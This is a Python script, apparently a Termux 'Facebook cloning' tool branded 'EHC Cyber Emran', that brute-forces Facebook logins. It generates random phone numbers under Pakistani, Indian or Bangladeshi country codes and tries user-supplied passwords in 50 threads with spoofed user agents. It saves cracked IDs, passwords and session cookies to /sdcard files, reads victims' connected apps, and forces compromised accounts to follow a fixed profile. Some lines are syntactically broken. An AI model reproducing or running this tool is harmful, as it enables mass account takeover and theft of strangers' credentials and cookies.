#𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝑬𝑴𝑹𝑨𝑵 𝟎𝟒
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass




def Emran():
    os.system('clear')
    print(logo)
    print('\033[1;32m================================')
    print(' \033[38;5;46m[𝟏] 𝑺𝑻𝑨𝑹𝑻 𝑹𝑺𝑵𝑫𝑶𝑴 𝑾𝑶𝑹𝑲𝑰𝑵𝑮')
    print(' \033[38;5;46m[𝟐] 𝑬𝑿𝑰𝑻 𝑾𝑶𝑹𝑲 𝑶𝑭')
    print('\033[1;32m================================')
    opt = input('\n   𝑪𝑯𝑶𝑶𝑺𝑬 𝑶𝑷𝑻𝑰𝑶𝑵>>> ')
    if opt == '1':
        i()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')




import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""
    \033[38;5;46m______  \x1b[38;5;196m__  ___  \033[37;1m____   \033[33;1m___     \033[34;1m_   __
   \033[38;5;46m/ ____/ \x1b[38;5;196m/  |/  / \033[37;1m/ __ \ \033[33;1m/   |   \033[34;1m/ | / /
  \033[38;5;46m/ __/   \x1b[38;5;196m/ /|_/ / \033[37;1m/ /_/ /\033[33;1m/ /| |  \033[34;1m/  |/ / 
 \033[38;5;46m/ /___  \x1b[38;5;196m/ /  / / \033[37;1m/ _, _/\033[33;1m/ ___ | \033[34;1m/ /|  /  
\033[38;5;46m/_____/ \x1b[38;5;196m/_/  /_/ \033[37;1m/_/ |_|\033[33;1m/_/  |_|\033[34;1m/_/ |_/
    \x1b[38;5;196m╔═════════════════════════════════╗
    \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  .d8888b.  \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 d88P  Y88b \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m8888888    8888888888 888        \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 888        \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 Y88b  d88P \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  "Y8888P"  \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m╚═════════════════════════════════╝""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    print('\033[1;32m============================================')
    print("\033[34;1m\t  𝙐𝙎𝙀 𝙊𝙐𝙍 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 𝘾𝙊𝘿𝙀  ")
    print('\033[1;32m============================================')
    print('\033[34;1m     \t     𝙋𝘼𝙆 𝘾𝙊𝘿𝙀𝙎\n     \033[38;5;46m𝟵𝟮𝟯𝟬𝟭, \033[1;33m𝟵𝟮𝟯𝟬𝟮 ,\033[1;33m𝟵𝟮𝟯𝟬𝟯 ,\033[38;5;46m𝟵𝟮𝟯𝟬𝟱  ...\033[0;97m')
    print('\033[1;32m============================================')
    print('\033[33;1     \t     𝙄𝙉𝘿𝙄𝘼 𝘾𝙊𝘿𝙀𝙎\n     \033[38;5;46m𝟵𝟭𝟳𝟳𝟴, \033[1;33m𝟵𝟭𝟵𝟯𝟬 ,\033[1;33m𝟵𝟭𝟵𝟬𝟮 ,\033[38;5;46m𝟵𝟭𝟳𝟭𝟮  ...\033[0;97m')
    print('\033[1;32m============================================')
    print('\033[33;1     \t     𝘽𝘿 𝘾𝙊𝘿𝙀𝙎\n     \033[38;5;46m𝟴𝟴𝟬𝟭𝟲, \033[1;33m𝟴𝟴𝟬𝟭𝟳 ,\033[1;33m𝟴𝟴𝟬𝟭𝟴 ,\033[38;5;46m𝟴𝟴𝟬𝟭𝟵  ...\033[0;97m')
    print('\033[1;32m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' \033[34;1m𝑬𝑿𝑨𝑴𝑷𝑳𝑬: [𝟐𝟎𝟎𝟎]-[𝟑𝟎𝟎𝟎]-[𝟓𝟎𝟎𝟎𝟎]-[𝟐𝟎𝟎𝟎𝟎]\n\n 𝑷𝑼𝑻 CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    Emranehc = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        Emranehc.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;32m============================================')
        print('\033[1;36m 𝑻𝑶𝑻𝑨𝑳 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫: '+tl)
        print('\033[1;36m 𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝑬𝑴𝑹𝑨𝑵')
        print('\033[1;31m 𝑼𝑺𝑬 𝑨𝑬𝑹𝑶𝑷𝑳𝑨𝑵𝑬 𝑴𝑶𝑫 ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in Emranehc:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_free_fb = 
            {'authority': 'mbasic.facebook.com',
            'method':'GET',
             'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '1.5625',
            'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AffRKgQB9kZqTu6DRp5UF0lUifoRt5NZ5Biz4vc_X32-y-IvoenZ_aGX1gg0kHGMkmiZ1SJh0AiOhmnNJ2t6jMO75kBZJmn_FBFNoeAzCNcavg&smuh=1280&lh=Ac9gxB0o_CBgQzi0wX8&wtsid=rdr_0OSkX5PmjwdG8VWtR&ref_component=mbasic_footer&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"V2111"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"""❴\033[38;5;46m𝙊𝙆 𝙄𝘿_❵]
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     𝙀𝙈𝙍𝘼𝙉 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     𝙀𝙈𝙍𝘼𝙉 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                cek_apk(session,coki)
                open('/sdcard/EMRAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"""❴\033[38;5;46m𝘾𝙋 𝙄𝘿_❵]
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     𝙀𝙈𝙍𝘼𝙉 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     𝙀𝙈𝙍𝘼𝙉 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/EMRAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[EHC] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
Emran()
 
